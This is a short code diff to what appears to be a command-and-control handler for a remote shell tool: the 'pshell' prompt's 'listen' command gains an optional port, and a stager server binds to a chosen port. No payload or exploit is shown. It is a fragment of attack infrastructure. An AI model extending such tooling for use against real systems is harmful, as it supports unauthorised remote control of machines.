@@ -212,7 +212,15 @@ def handle_agent(conn, addr):
 def pre_shell():
     while True:
         cmd = input("pshell> ")
-        if cmd == "listen":
+        if cmd.startswith("listen"):
+            port = 9001
+            if len(cmd.split()) < 2:
+                pass
+            else:
+                _, port = cmd.split()
+
+            PORT = int(port)
+
             server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
@@ -263,7 +271,7 @@ def pre_shell():
 
                 stager_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 stager_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                stager_server.bind((HOST, PORT))
+                stager_server.bind((HOST, int(s_port)))
                 stager_server.listen(1)
 
                 stager_conn, stager_addr = stager_server.accept()
